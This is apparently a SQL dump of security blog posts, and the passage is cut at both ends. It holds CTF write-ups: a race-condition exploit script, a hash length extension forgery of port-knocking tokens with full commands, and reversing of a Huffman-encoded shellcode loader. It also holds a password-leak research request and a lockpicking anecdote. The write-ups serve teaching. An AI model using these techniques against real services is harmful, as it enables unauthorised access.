response = (HTTParty.post(\"#{TARGET}/register.php\", :body => { :username => name, :password => name }))\r\nend\r\n\nI ran that against my test host and checked the database. Instead of failing miserably, like it by all rights should have, it somehow caused the second query—the INSERT into privs code— to fail entirely! I attempted to log in as the new user, and it gave me the key on my test server.\nHonestly, I have no idea why that worked. If I ran it multiple times, it worked somewhere between 1/2 and 1/4 of the time. Not bad, for a race condition! It must have caused a silent SQL error or something, I\'m not entirely sure.\nAnyway, I then I tried running it against the real service about 100 times, with no luck. I tried running one instance and a bunch in parallel. No deal. Hmm! From my home DSL connection, it was slowwwwww, so I reasoned that maybe there\'s just too much lag.\nTo fix that, I copied the exploit to my server, which has high bandwidth (thanks to SkullSpace for letting me keep my gear there :) ) and ran the same exploit, which worked on the first try! That was it, I had the flag.\nConclusion\nI\'m not entirely sure why my exploit worked, but it worked great (assuming decent latency)!\nI realize this challenge (and story) aren\'t super exciting, but I like that the vulnerability was due to a race condition. Something nice and obscure, that we hear about and occasionally fix, but almost never exploits. Props to the GitS team for creating the challenge!\nAnd also, if anybody can see what I\'m missing, please drop me an email ron @ skullsecurity.net) and I\'ll update this blog. I approve all non-spam comments, eventually, but I don\'t get notifications for them at the moment.', '\'GITS2015\', \'Hacking\'', 'https://blog.skullsecurity.org/2015/gits-2015-aart-php-race-condition');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (18, 'GitS 2015: knockers.py (hash extension vulnerability)', 'Ron Bowes', '2015-1-21', 'As many of you know, last weekend was Ghost in the Shellcode 2015! There were plenty of fun challenges, and as always I had a great time competing! This will be my first of four writeups, and will be pretty simple (since it simply required me to use a tool that already exists (and that I wrote :) ))\nThe level was called \"knockers\". It\'s a simple python script that listens on an IPv6 UDP port and, if it gets an appropriately signed request, opens one or more other ports.  The specific challenge gave you a signed token to open port 80, and challenged you to open up port 7175. The service itself listened on port 8008 (\"BOOB\", to go with the \"knockers\" name :) ).\nYou can download the original level here (Python).\n\nThe vulnerability\nTo track down the vulnerability, let\'s have a look at the signature algorithm:\n\r\ndef generate_token(h, k, *pl):\r\n        m = struct.pack(\'!\'+\'H\'*len(pl), *pl)\r\n        mac = h(k+m).digest()\r\n        return mac + m\r\n\nIn that function, h is a hash function (sha-512, specifically), k is a random 16-byte token, randomly generated, and m is an array of 16-bit representation of the ports that the user wishes to open. So if the user wanted to open port 1 and 2, they\'d send \"\\x00\\x01\\x00\\x02\", along with the appropriate token (which the server administrator would have to create/send, see below).\nHmm... it\'s generating a mac-protected token and string by concatenating strings and hashing them? If you\'ve followed my blog, this might sound very familiar! This is a pure hash extension vulnerability!\nI\'m not going to re-iterate what a hash extension vulnerability is in great detail—if you\'re interested, check out the blog I just linked—but the general idea is that if you generate a message in the form of msg + H(secret + msg), the user can arbitrarily extend the message and generate a new signature! That means if we have access to any port, we have access to every port!\nLet\'s see how!\nGenerating a legit token\nTo use the python script linked above, first run \'setup\':\n\r\n$ python ./knockers.py setup\r\nwrote new secret.txt\r\n\nWhich generates a new secret. The secret is just a 16-byte random string that\'s stored on the server. We don\'t really need to know what the secret is, but for the curious, if you want to follow along and verify your numbers against mine, it\'s:\n\r\n$ cat secret.txt\r\n2b396fb91a76307ce31ef7236e7fd3df\r\n\nNow we use the tool (on the same host as the secret.txt file) to generate a token that allows access on port 80:\n\r\n$ python ./knockers.py newtoken 80\r\n83a98996f0acb4ad74708447b303c081c86d0dc26822f4014abbf4adcbc4d009fbd8397aad82618a6d45de8d944d384542072d7a0f0cdb76b51e512d88de3eb20050\r\n\nNotice the first 512 bits (64 bytes) is the signature—which is logical, since it\'s sha512—and the last 16 bits (2 bytes) are 0050, which is the hex representation of 80. We\'ll split those apart later, when we run hash_extender, but for now let\'s make sure the token actually works first!\nWe start the server:\n\r\n$ python ./knockers.py serve\r\n\nAnd in another window, or on another host if you prefer, send the generated token:\n\r\n$ python ./knockers.py knock localhost 83a98996f0acb4ad74708447b303c081c86d0dc26822f4014abbf4adcbc4d009fbd8397aad82618a6d45de8d944d384542072d7a0f0cdb76b51e512d88de3eb20050\r\n\nIn the original window, you\'ll see that it was successful:\n\r\n$ python ./knockers.py serve\r\nClient: ::1 len 66\r\nallowing host ::1 on port 80\r\n\nNow, let\'s figure out how to create a token for port 7175!\nGenerating an illegit (non-legit?) token\nSo this is actually the easiest part. It turns out that the awesome guy who wrote hash_extender (just kidding, he\'s not awesome) built in everything you needed for this attack!\nDownload and compile hash_extender if needed (definitely works on Linux, but I haven\'t tested on any other platforms—testers are welcome!), and run it with no arguments to get the help dump. You need to pass in the original data (that\'s \"\\x00\\x80\"), the data you want to append (7175 => \"\\x1c\\x07\"), the original signature, and the length of the secret (which is 16 bytes). You also need to pass in the types for each of the parameters (\"hex\") in case the defaults don\'t match (in this case, they don\'t—the appended data is assumed to be raw).\nAll said and done, here\'s the command:\n\r\n./hash_extender --data-format hex --data 0050 \\\r\n  --signature-format hex --signature 83a98996f0acb4ad74708447b303c081c86d0dc26822f4014abbf4adcbc4d009fbd8397aad82618a6d45de8d944d384542072d7a0f0cdb76b51e512d88de3eb2 \\\r\n  --append \"1c07\" --append-format hex \\\r\n  -l 16\r\n\nYou can pass in the algorithm and the desired output format as well, if we don\'t, it\'ll just output in every 512-bit-sized hash type. The output defaults to hex, so we\'re happy with that.\n\r\n$ ./hash_extender --data-format hex --data 0050 --signature-format hex --signature 83a98996f0acb4ad74708447b303c081c86d0dc26822f4014abbf4adcbc4d009fbd8397aad82618a6d45de8d944d384542072d7a0f0cdb76b51e512d88de3eb2 --append \"1c07\" --append-format hex -l 16\r\nType: sha512\r\nSecret length: 16\r\nNew signature: 4bda887c0fc43636f39ff38be6d592c2830723197b93174b04d0115d28f0d5e4df650f7c48d64f7ca26ef94c3387f0ca3bf606184c4524600557c7de36f1d894\r\nNew string: 005080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000901c07\r\n\r\nType: whirlpool\r\nSecret length: 16\r\nNew signature: f4440caa0da933ed497b3af8088cb78c49374853773435321c7f03730386513912fb7b165121c9d5fb0cb2b8a5958176c4abec35034c2041315bf064de26a659\r\nNew string: 0050800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000901c07\r\n\nIgnoring the whirlpool token, since that\'s the wrong algorithm, we now have a new signature and a new string. We can just concatenate them together and use the built-in client to use them:\n\r\n$ python ./knockers.py knock localhost 4bda887c0fc43636f39ff38be6d592c2830723197b93174b04d0115d28f0d5e4df650f7c48d64f7ca26ef94c3387f0ca3bf606184c4524600557c7de36f1d894005080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000901c07\r\n\nAnd checking our server, we see a ton of output, including successfully opening port 7175:\n\r\n$ python ./knockers.py serve\r\nClient: ::1 len 66\r\nallowing host ::1 on port 80\r\nClient: ::1 len 178\r\nallowing host ::1 on port 80\r\nallowing host ::1 on port 32768\r\nallowing host ::1 on port 0\r\nallowing host ::1 on port 0\r\n[...repeated like 100 times...]\r\nallowing host ::1 on port 0\r\nallowing host ::1 on port 0\r\nallowing host ::1 on port 144\r\nallowing host ::1 on port 7175\r\n\nAnd that\'s it! At that point, you can visit http://knockers.2015.ghostintheshellcode.com:7175 and get the key.\nConclusion\nThis is a pure hash extension vulnerability, which required no special preparation—the hash_extender tool, as written, was perfect for the job!\nMy favourite part of that is looking at my traffic graph on github:\n\nIt makes me so happy when people use my tool, it really does!', '\'Crypto\', \'GITS2015\', \'Tools\'', 'https://blog.skullsecurity.org/2015/gits-2015-knockers-py-hash-extension-vulnerability');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (19, 'Call for help: researching the recent gmail password leak', 'Ron Bowes', '2014-9-12', 'Hey folks,\nYou probably heard this week about 5 million @gmail.com accounts posted. I\'ve been researching it independently, and was hoping for some community help (this is completely unrelated to the fact that I work at Google - I just like passwords).\nI\'m reasonably sure that the released list is an amalgamation of a bunch of other lists and breaches. But I don\'t know what ones - that\'s what I\'m trying to find out!\nWhich brings me to how you can help: people who can recognize which site their password came from. I\'m trying to build a list of which breaches were aggregated to create this list, in the hopes that I can find breaches that were previously unreported!\nIf you want to help:\n\n1. Check your email address on https://haveibeenpwned.com/\n2. If you\'re in the list, email ihazhacked@skullsecurity.org from the associated account\n3. I\'ll tell you the password that was associated with that account\n4. And, most importantly, you tell me which site you used that password on!\n\nIn a couple days/weeks (depending on how many responses I get), I\'ll release the list of providers!\nThanks! And, as a special \'thank you\' to all of you, here are the aggregated passwords from the breach! And no, I\'m not going to release (or keep) the email list. :)', '\'Passwords\'', 'https://blog.skullsecurity.org/2014/call-for-help-researching-the-recent-gmail-password-leak');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (20, 'Opening the mysterious hatch of mystery', 'Ron Bowes', '2014-6-17', 'Every once in awhile, I like to post something random here. This is another one of those times. If you want some real security info, move along now. :)\nThis is a story about a random locked hatch I found in the middle of a field. Originally it was just neat, but after the \"Safe\" incident and the creating of /r/whatsinthisthing, I realized I had to learn more. What did it contain? Tunnels? Treasure? Dragons? A valve? I didn\'t know, but I had to find out!\n(spoiler: it wasn\'t a dragon)\n\nThere\'s a strange place in my hometown of Winnipeg. And I don\'t mean the corner of Higgins and Main, either, I mean a field just north of where I grew up that\'s becoming harder and harder to access (thanks to the Centre Port Highway). In this field, the grass grows tall, the woodticks come out to play, and there are a bunch of random concrete pillars (more photos here). There\'s also a geocache, if you\'re into that.\nBut this story isn\'t about the pillars. It\'s about a hatch in the ground. In the middle of nowhere.\nI visited the place 2 or 3 times when I was younger. At one point, I found a metal hatch in the ground:\n\n\nFinally, on one particularly dark night, I met up with a couple friends and we drove out there. This was probably a year ago now, although I waited until just recently to take the photos. I didn\'t bring my camera at the time. Luckily, I left it unlocked, not that shockingly, nobody else had touched it.\nArmed with lockpicks, we were gonna get this damn thing open! Unfortunately, the grass was tall, the mosquitoes were out, and it was dark as... well, dark as night. The grass had just been cut in the photos above (that\'s actually another mystery... this field is in the middle of nowhere, and is clearly serving no purpose at this point, but somebody has recently cut the grass?), but the grass on that night was quite tall.\nEventually, we found it and broke out the lockpicks. It had a shitty Master Lock on it:\n\nI figured it\'d be no problem, since I own and have picked like a dozen of these, but this one was rusty! Plus, it was dark, we were laying in wet tick-infested grass, and there were mosquitoes everywhere. But, we really wanted to get this done!\nWorking by headlamps, me and one of my friends took turns trying to get the lock to turn. Trying and trying and trying....\nAt one point, we went to the car and got the tire iron, because we realized there were bolts (you can\'t see them in the photos) that just happened to be the right size! After working on the nuts for awhile, we realized the cover was welded on, and we gave up on that idea.\nBack to picking. Picking and picking and picking... At some point, I passed it back to her, and she said \"you know it\'s open now, right?\" - I had no idea! Apparently I had gotten it turning without even feeling it, because of the age and rust (that\'s how good of a lockpicker I am ;) ).\nSo now, the lock was open (you can also see the bolts we tried to take out):\n\nAnd I could life the hatch...\n\nAfter putting a lot of muscle into it - it had clearly been a *long* time since it had been opened - it finally came open!\n\nYou can imagine my excitement! Was it treasure? A lost city?\nI\'ll hotlink the two pictures of the inside so you don\'t accidentally spoil then. :)\nSo there you have it... a concrete cylinder with a bolt on it. That\'s it. THAT\'S IT!\nIt was disappointing but eh? At least I got it open. Take that, Safe Guy!', '\'Random\'', 'https://blog.skullsecurity.org/2014/opening-the-mysterious-hatch-of-mystery');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (21, 'Defcon Quals writeup for byhd (reversing a Huffman Tree)', 'Ron Bowes', '2014-5-21', 'This is my writeup for byhd, a 2-point challenge from the Defcon Qualifier CTF. You can get the files, including my annotated assembly file, here. This is my second (and final) writeup for the Defcon Qualifiers, you can find the writeup for shitsco here.\nThis was a reverse engineering challenge where code would be constructed based on your input, then executed. You had to figure out the exact right input to generate a payload that would give you access to the server (so, in a way, there was some exploitation involved).\nUp till now, cnot from PlaidCTF has probably been my favourite hardcore reversing level, but I think this level has taken over. It was super fun!\n\nThe setup\nWhen you fire up byhd, it listens on port 9730 and waits for connections:\n$ strace ./byhd\r\n[...]\r\nbind(3, {sa_family=AF_INET, sin_port=htons(9730), sin_addr=inet_addr(\"192.168.1.201\")}, 16) = 0\r\nlisten(3, 20)                           = 0\r\naccept(3,\r\n\nWhen you connect, it forks off a new process, and therefore we have to fix it as described in an old post I wrote to ensure everything stays in one process (otherwise, you\'re gonna have a Bad Time). You also have to add a user and group and such, and you may need to run it as root.\nAfter I fix that, it reads from the socket properly! But when I send data to it, it just disconnects me:\n\r\n$ nc 192.168.1.103 9730 | hexdump -C\r\nhello\r\n00000000  ff ff ff ff                                       |....|\r\n\nBecause it\'s so, so common in protocols, I tried to prefix a 4-byte length to my string:\n\r\n$ echo -ne \'\\x04\\x00\\x00\\x00\\x41\\x41\\x41\\x41\' | nc -vv 192.168.1.103 9730\r\n192.168.1.103: inverse host lookup failed:\r\n(UNKNOWN) [192.168.1.103] 9730 (?) open\r\n sent 8, rcvd 0\r\n\nNo response this time? On the server side, we can see why:\n\r\n# ./byhd-fixed\r\nSegmentation fault\r\n\nThe crash is really weird, too:\n\r\n# gdb -q ./byhd-fixed\r\n(gdb) run\r\n\r\nProgram received signal SIGBUS, Bus error.\r\n0x0000000000401cc1 in ?? ()\r\n(gdb) x/i $rip\r\n=> 0x401cc1:    call   0x4010b0 <munmap@plt>\r\n\nSIGBUS at a call? Wat? Instead of AAAA, let\'s send it \\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0:\n\r\n$ echo -ne \'\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\' | nc -vv 192.168.1.103 9730\r\n\nWhich results in:\n\r\n(gdb) run\r\n\r\nProgram received signal SIGSEGV, Segmentation fault.\r\n0x00007ffff7ff9000 in ?? ()\r\n(gdb) x/8i $rip\r\n=> 0x7ffff7ff9000:      push   rax\r\n   0x7ffff7ff9001:      nop\r\n   0x7ffff7ff9002:      push   rdi\r\n   0x7ffff7ff9004:      (bad)\r\n   0x7ffff7ff9005:      jg     0x7ffff7ff9007\r\n   0x7ffff7ff9007:      add    dh,bl\r\n   0x7ffff7ff9009:      fs\r\n   0x7ffff7ff900a:      fcomip st,st(7)\r\n\r\n(gdb) x/32xb $rip\r\n0x7ffff7ff9000: 0x50    0x90    0xff    0xf7    0xff    0x7f    0x00    0x00\r\n0x7ffff7ff9008: 0xde    0x64    0xdf    0xf7    0xff    0x7f    0x00    0x00\r\n0x7ffff7ff9010: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00\r\n0x7ffff7ff9018: 0xc0    0x53    0xdf    0xf7    0xff    0x7f    0x00    0x00\r\n\nI don\'t know what\'s going on, but that sure doesn\'t look like code it\'s trying to run!\nThat\'s enough of messing around, we\'re gonna have to do a deep dive to figure out what\'s happening...\nReading itself\nAfter it forks off a thread, and before it reads anything from the socket, the process opens itself and reads all the bytes:\n\r\n# strace ./byhd-fixed\r\nexecve(\"./byhd-fixed\", [\"./byhd-fixed\"], [/* 21 vars */]) = 0\r\nbrk(0)                                  = 0x1d66000\r\n[...]\r\nbind(3, {sa_family=AF_INET, sin_port=htons(9730), sin_addr=inet_addr(\"192.168.1.103\")}, 16) = 0\r\nlisten(3, 20)                           = 0\r\naccept(3, {sa_family=AF_INET, sin_port=htons(39624), sin_addr=inet_addr(\"192.168.1.201\")}, [16]) = 4\r\n[...]\r\nchdir(\"/home/byhd\")                     = 0\r\nstat(\"./byhd-fixed\", {st_mode=S_IFREG|0755, st_size=18896, ...}) = 0\r\nopen(\"./byhd-fixed\", O_RDONLY)          = 3\r\nread(3, \"\\177ELF\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\2\\0>\\0\\1\\0\\0\\0\\220\\21@\\0\\0\\0\\0\\0\"..., 18896) = 18896\r\nclose(3)                                = 0\r\nread(4,\r\n[...]\r\n\nThat\'s interesting! First it accepts a connection, then it gets the size of itself, opens itself, and reads the whole thing. Then, finally, it tries to read from the socket it opened.\nMy first hunch was that it\'s some anti-tampering code, which isn\'t 100% wrong (nor was it 100% right). I threw together a quick wrapper in C to fix things:\n\r\n#include <unistd.h>\r\n\r\nint main(int argc, const char *argv[])\r\n{\r\n  execlp(\"/home/byhd/byhd-fixed\", \"/home/byhd/byhd\", NULL);\r\n\r\n  printf(\"Fail :(\\n\");\r\n  return 0;\r\n}\r\n\nNote that I\'m running \"/home/byhd/fixed/byhd\", but setting argv[0] to \"/home/byhd/byhd\". You can verify with strace that it indeed opens the \'real\' executable and not the modified one:\n\r\n# strace ./wrapper\r\nexecve(\"./wrapper\", [\"./wrapper\"], [/* 21 vars */]) = 0\r\nbrk(0)\r\n[...]\r\nexecve(\"/home/byhd/byhd-fixed\", [\"/home/byhd/byhd\"], [/* 21 vars */]) = 0\r\nbrk(0)                                  = 0x2007000\r\n[...]\r\nchdir(\"/home/byhd\")                     = 0\r\nstat(\"/home/byhd/byhd\", {st_mode=S_IFREG|0644, st_size=18896, ...}) = 0\r\nopen(\"/home/byhd/byhd\", O_RDONLY)       = 3\r\nread(3, \"\\177ELF\\2\\1\\1\\0\\0\\0\\0\\0\\0\\0\\0\\0\\2\\0>\\0\\1\\0\\0\\0\\220\\21@\\0\\0\\0\\0\\0\"..., 18896) = 18896\r\nclose(3)                                = 0\r\nread(4, \"\\20\\0\\0\\0\", 4)                 = 4\r\nread(4, \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\", 16) = 16\r\nmmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f4fccf13000\r\n--- SIGSEGV (Segmentation fault) @ 0 (0) ---\r\n+++ killed by SIGSEGV +++\r\nSegmentation fault (core dumped)\r\n\nHistogram\nFor the next little while, I jumped around quite a bit because I wasn\'t sure exactly what I was trying to do. I eventually decided to start from the top; that is, the code that runs right after it reads the file.\nBefore I explain what\'s happening, let\'s take a look at some assembly! If you\'re interested in the actual code, have a look at this; otherwise, just skip past to the description. I re-implemented this in a few lines of Ruby.\nNote that I\'ve removed a bunch of in-between code, including register movement and error handling, to just show the useful parts:\n\r\n; The function definition\r\n.text:0040173B ; int __cdecl generate_histogram(char *itself, size_t length)\r\n.text:0040173B\r\n\r\n; Allocate 0x400 bytes\r\n.text:0040175F                 mov     edi, 400h       ; size\r\n.text:00401764                 call    _malloc         ; Allocate 0x400 bytes\r\n.text:00401769                 mov     [rbp+allocated], rax\r\n\r\n; In this loop, ebx is the loop counter\r\n.text:0040178C top_loop:                               ; CODE XREF: generate_histogram+7Cj\r\n\r\n; Point \'rax\' to the current byte (the string plus the index)\r\n.text:0040178C                 mov     edx, ebx        ; edx = current iteration\r\n.text:0040178E                 mov     rax, [rbp+itself]\r\n.text:00401792                 add     rax, rdx        ; Go to the current offset in the file\r\n\r\n; Read the current byte\r\n.text:00401795                 movzx   eax, byte ptr [rax] ; Read the current byte\r\n\r\n; Multiply it by 4\r\n.text:0040179B                 lea     rdx, [rax*4+0]  ; rdx = current_byte * 4\r\n\r\n; Set rax to that index in the array\r\n.text:004017A3                 mov     rax, [rbp+allocated] ; rax = allocated buffer\r\n.text:004017A7                 add     rax, rdx        ; Go to that offset\r\n\r\n; Increment the index\r\n.text:004017AA                 mov     edx, [rax]\r\n.text:004017AC                 add     edx, 1\r\n.text:004017AF                 mov     [rax], edx      ; Increment that offset\r\n\r\n; Increment the loop counter\r\n.text:004017B1                 add     ebx, 1\r\n.text:004017B4\r\n.text:004017B4 bottom_loop:                            ; CODE XREF: generate_histogram+4Fj\r\n\r\n; Loop till we\'re at the end, then return\r\n.text:004017B4                 cmp     ebx, [rbp+itself_length]\r\n.text:004017B7                 jb      short top_loop\r\n.text:004017C9                 retn\r\n\nIt turns out, the code generates a histogram based on the executable file. In other words, it basically does this:\n\r\ndata = File.new(ARGV[0]).read\r\n\r\nhistogram = {}\r\nhistogram.default = 0\r\n\r\ndata.each_byte() do |b|\r\n  histogram[b.chr] = histogram[b.chr] + 1\r\nend\r\nputs(histogram)\r\n\nWhich might look like:\n\r\n$ ruby histogram.rb /etc/passwd\r\n{\"r\"=>73, \"o\"=>119, \"t\"=>54, \":\"=>204, \"x\"=>38, \"0\"=>39, \"/\"=>141, \"b\"=>78, \"i\"=>80, \"n\"=>107, \"a\"=>105, \"s\"=>78, \"h\"=>22, \"\\n\"=>34, \"1\"=>41, \"f\"=>27, \"l\"=>71, \"e\"=>85, \"d\"=>81, \"m\"=>35, \"2\"=>18, \"3\"=>16, \"4\"=>13, \"v\"=>21, \"p\"=>58, \"7\"=>3, \"y\"=>31, \"c\"=>13, \"5\"=>12, \"u\"=>33, \"w\"=>9, \"6\"=>10, \"9\"=>3, \"g\"=>39, \" \"=>68, \"8\"=>6, \"+\"=>2, \"q\"=>2, \"k\"=>7, \"z\"=>4, \"-\"=>1}\r\n\nRunning that code on the actual binary, it works great; but it\'s a lot longer and much uglier output, so I didn\'t want to include it here. Feel free to try :)\nI was still working off the assumption this was all anti-tampering code. As I said earlier, that was only partly right...\nBuilding a tree\nThis is where it started to get weird and interesting. I could understand the histogram being generated, but then it stated adding and removing stuff from the array! What was happening!?\nOnce again, here\'s the actual annotated code, with the error handling and stuff removed. Feel free to read or skip it!\n\r\n.text:00402127 enter_second_loop:                      ; CODE XREF: generate_block_tree+2AFj\r\n\r\n; Remove and store the smallest entry\r\n.text:00402127                 mov     rax, [rbp+entry_list] ; An array of 256 8-byte values, each of which points to 20 bytes of allocated memory\r\n.text:0040212B                 mov     rdi, rax        ; allocated_block\r\n.text:0040212E                 call    get_smallest_entry ; Removes the smallest histogram entry from the list and returns it\r\n.text:00402133                 mov     [rbp+smallest_entry], rax\r\n\r\n; Remove and store the next smallest entry\r\n.text:00402137                 mov     rax, [rbp+entry_list] ; An array of 256 8-byte values, each of which points to 20 bytes of allocated memory\r\n.text:0040213B                 mov     rdi, rax        ; allocated_block\r\n.text:0040213E                 call    get_smallest_entry ; Removes the smallest histogram entry from the list and returns it\r\n.text:00402143                 mov     [rbp+next_smallest_entry], rax\r\n\r\n; Allocate memory for a new entry\r\n.text:00402165                 mov     edi, 20h        ; size\r\n.text:0040216A                 call    _malloc         ; Allocate space for a new entry\r\n.text:0040216F                 mov     [rbp+new_entry], rax\r\n\r\n; Store the smallest entry in the \'left\' branch\r\n.text:004021B2                 mov     rax, [rbp+new_entry]\r\n.text:004021B6                 mov     rdx, [rbp+smallest_entry]\r\n.text:004021BA                 mov     [rax+entry_struct.left_histogram], rdx\r\n\r\n; Store the next-smallest entry in the \'right\' branch\r\n.text:004021BD                 mov     rax, [rbp+new_entry]\r\n.text:004021C1                 mov     rdx, [rbp+next_smallest_entry]\r\n.text:004021C5                 mov     [rax+entry_struct.right_histogram], rdx\r\n\r\n; Get the sum of the two entry values (the character counts, if they\'re leaf nodes)\r\n.text:004021E2                 mov     rax, [rbp+smallest_entry] ; ** This section puts the two smallest histograms into a new field, then puts their sum into the \'value\' entry\r\n.text:004021E6                 mov     edx, [rax+entry_struct.histogram_entry]\r\n.text:004021E9                 mov     rax, [rbp+next_smallest_entry]\r\n.text:004021ED                 mov     eax, [rax+entry_struct.histogram_entry]\r\n.text:004021F0                 add     edx, eax\r\n\r\n; Store the sum of the two child nodes in the new node\'s entry\r\n.text:004021F2                 mov     rax, [rbp+new_entry]\r\n.text:004021F6                 mov     [rax+entry_struct.histogram_entry], edx\r\n\r\n; Store the new node at the end of the list\r\n.text:00402201                 mov     rsi, rdx        ; new_entry\r\n.text:00402204                 mov     rdi, rax        ; entry_list\r\n.text:00402207                 call    add_entry_to_end_maybe\r\n\nWhat I could see in the code is that it removed the two smallest entries, created a new entry that points to them, and put it at the end of the list. Then it would loop until there was only one entry. Typing it like that makes it sound really obvious to me, but digging through the code was remarkably difficult. In fact, it took me a long, long time to realize that it was removing the smallest entries and adding a new entry. I totally misunderstood the code...\nAnyway, let\'s look at an example: you have the string \'eebddaafbcdfdbaee\'. The histogram looks like:\n\r\n{\"a\"=>3, \"b\"=>3, \"c\"=>1, \"d\"=>4, \"e\"=>4, \"f\"=>2}\r\n\nWe\'ll re-write it, for simplicity, like this:\n\r\na[3]  b[3]  c[1]  d[4]  e[4]  f[2]\r\n\nFirst, it removes the smallest two entries from the list, c[1] and f[2]:\n\r\na[3]  b[3]  d[4]  e[4]\r\n\nAnd replaces them with another node that contains their combined value, with the two removed values underneath:\n\r\na[3]  b[3]  d[4]  e[4]  [3]\r\n                        / \\\r\n                     c[1] f[2]\r\n\nThen the next two smallest values are removed and combined under a single parent:\n\r\nd[4]  e[4]  [3]       [6]\r\n            / \\       / \\\r\n         c[1] f[2] a[3] b[3]\r\n\nThen remove the smallest two again. This step is interesting because one of the smallest nodes is a non-leaf:\n\r\ne[4]   [6]\r\n       / \\\r\n    a[3] b[3]\r\n\nAdd them back under a common node at the end:\n\r\ne[4]   [6]       [7]\r\n       / \\       / \\\r\n    a[3] b[3]  [3] d[4]\r\n               / \\\r\n             c[1] f[2]\r\n\nThen the [4] and [6] are similarly combined:\n\r\n     [10]         [7]\r\n     /  \\         / \\\r\n  e[4]  [6]     [3] d[4]\r\n        / \\       / \\\r\n     a[3] b[3]  c[1] f[2]\r\n\nAnd finally, we only have a single parent node:\n\r\n            [17]\r\n          /     \\\r\n     [10]         [7]\r\n     /  \\         / \\\r\n  e[4]  [6]     [3] d[4]\r\n        / \\      /    \\\r\n     a[3] b[3] c[1]   f[2]\r\n\nAnd there you have it! A tree!\nIt\'s really funny: when I was working on this, I had the feeling at the back of my mind that this was a real tree algorithm, but I read a bunch on Wikipedia and couldn\'t find one that matched, so I gave up and just continued. Today, my co-worker mentioned \"oh, like Huffman encoding!\" and I said \"nah, there\'s no compression involved\".\nBut, as soon as I built that tree by hand, I realized that this absolutely IS a Huffman Tree! And checking Wikipedia, I can confirm that it is. That would have made the last part a whole lot easier...\nUsing the incoming data\nNow, what\'s going on with the data I send in? I already confirmed that it\'s a 4-byte length value followed by some code, and the program crashes in different and creative ways depending on what code I send it. Now what?\nIf I\'d recognized the Huffman Tree, I could have made a pretty good guess: that we\'re sending huffman-compressed data. And it would have been right, too! Unfortunately, I missed the obvious hints...\nAnyway, I don\'t really want to dwell too much on this part, since it\'s conceptually really simple. There was a loop that would go through the data string you sent it, and touch each byte you sent 8 times. Hmm. Then there was some bitwise arithmetic that would do some shifting and ANDing of each byte. You\'d think I would have figured out by that that it\'s breaking the string into bits, but I didn\'t. What made the light bulb go on was this:\n\r\n.text:00401315                 and     eax, 1\r\n.text:00401318                 test    eax, eax\r\n.text:0040131A                 jz      short use_left\r\n.text:0040131C                 mov     rax, [rbp+current_node] ; starts at the root\r\n.text:00401320                 mov     rax, [rax+entry_struct.right_histogram]\r\n.text:00401324                 mov     [rbp+current_node], rax ; starts at the root\r\n.text:00401328                 jmp     short restart_loop\r\n.text:0040132A ; ---------------------------------------------------------------------------\r\n.text:0040132A\r\n.text:0040132A use_left:                               ; CODE XREF: walk_tree_to_get_value+9Ej\r\n.text:0040132A                 mov     rax, [rbp+current_node] ; starts at the root\r\n.text:0040132E                 mov     rax, [rax+entry_struct.left_histogram]\r\n.text:00401331                 mov     [rbp+current_node], rax ; starts at the root\r\n.text:00401335\r\n.text:00401335 restart_loop:                           ; CODE XREF: walk_tree_to_get_value+ACj\r\n.text:00401335                 add     [rbp+current_index_maybe], 1\r\n\nBasically, based on the right-most bit in eax, it makes a decision to either jump to the left node or the right node. Then, when it gets to the leaf...\n\r\n.text:00401363                 mov     rax, [rbp+current_node] ; starts at the root\r\n.text:00401367                 movzx   eax, [rax+entry_struct.byte_value] ; Return the byte value at this leaf\r\n.text:00401374                 pop     rbx\r\n.text:00401375                 pop     rbp\r\n.text:00401376                 retn\r\n\n...it returns the byte value in that leaf. If you read up on Huffman Trees, you\'ll see that that\'s exactly how they work.\nThe calling function adds that byte value to the end of an executable memory segment. When we\'re done reading the tree, the list of leaf-node bytes we\'ve found are executed.\nTo summarize:\n\nBuild a histogram from itself\nConvert that histogram into a Huffman Tree\nRead data from the socket\nConvert that data to bits, and use those bits to navigate the tree\n\nWe\'re almost done but... how do we get that tree!?\nPutting it all together\nAll right, we understand the code, now we have to write an exploit. What do we do!?\nThe \"right\" way to do this is to build the same tree the same way, and to walk it from the node to the root to get he values. But this is a CTF and I want it to work on the first try, damnit! None of that \"reconstructing the exact algorithm\" nonsense! So I decided to steal their memory. :)\nSo, the first thing I did was put a breakpoint immediately after the tree was built to find the address of the root. On my box, the address of the root node, after the tree was built, happened to be 0x60e050. Then I wanted to dump the heap:\n\r\n(gdb) x/1000000xb 0x603000\r\n0x603000:       0x1b    0x0c    0x07    0x08    0x90    0x01    0x07    0x10\r\n0x603008:       0x14    0x00    0x00    0x00    0x1c    0x00    0x00    0x00\r\n0x603010:       0x80    0xe1    0xff    0xff    0x2a    0x00    0x00    0x00\r\n0x603018:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00\r\n0x603020:       0x14    0x00    0x00    0x00    0x00    0x00    0x00    0x00\r\n[...]\r\n\nI determined the starting address by trial and error - I wanted it to be as small as possible, but I needed the memory between it and the root node to be contiguous. 0x602000 wasn\'t allocated, but 0x603000 worked fine.\nI dumped that to a file from gdb, then processed the file with Ruby:\n\r\n# Split the file into lines\r\nfile.split(/\\n/).each do |line|\r\n  if(line =~ /Cannot/)\r\n    break\r\n  